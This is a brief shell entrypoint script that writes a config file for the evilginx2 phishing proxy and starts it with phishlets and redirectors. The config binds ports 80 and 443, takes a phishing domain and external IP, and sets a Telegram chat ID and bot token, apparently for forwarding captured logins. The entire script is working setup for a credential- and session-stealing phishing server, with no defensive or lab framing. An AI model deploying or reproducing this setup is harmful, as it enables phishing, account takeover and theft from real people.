#!/bin/sh
set -e
mkdir -p /root/.evilginx
cat > /root/.evilginx/config.json <<EOF
{
  "server_ip": "0.0.0.0",
  "http_port": 80,
  "https_port": ${PORT:-443},
  "domain": "${DOMAIN}",
  "ipv4_external": "${EXTERNAL_IP}",
  "chatid": "${CHAT_ID}",
  "teletoken": "${TELE_TOKEN}"
}
EOF
exec /usr/local/bin/evilginx2 -developer -p ./phishlets -t ./redirectors
